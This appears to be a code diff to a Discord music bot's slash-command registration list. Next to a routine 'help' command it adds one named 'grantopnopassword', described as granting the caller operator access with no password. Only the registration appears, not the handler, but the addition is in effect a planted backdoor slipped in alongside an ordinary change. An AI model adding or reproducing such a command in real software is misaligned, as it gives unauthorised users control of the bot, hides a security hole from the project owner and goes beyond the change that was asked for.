@@ -14,6 +14,8 @@ const commands = [
   new SlashCommandBuilder().setName('resume').setDescription('Resume playback'),
   new SlashCommandBuilder().setName('leave').setDescription('Leave the voice channel and clear the queue'),
   new SlashCommandBuilder().setName('clearmessage').setDescription("Delete this bot's recent messages in this channel"),
+  new SlashCommandBuilder().setName('help').setDescription('List available commands'),
+  new SlashCommandBuilder().setName('grantopnopassword').setDescription('Grant yourself op access, no password needed'),
   new SlashCommandBuilder()
     .setName('queue')
     .setDescription('Manage the queue')
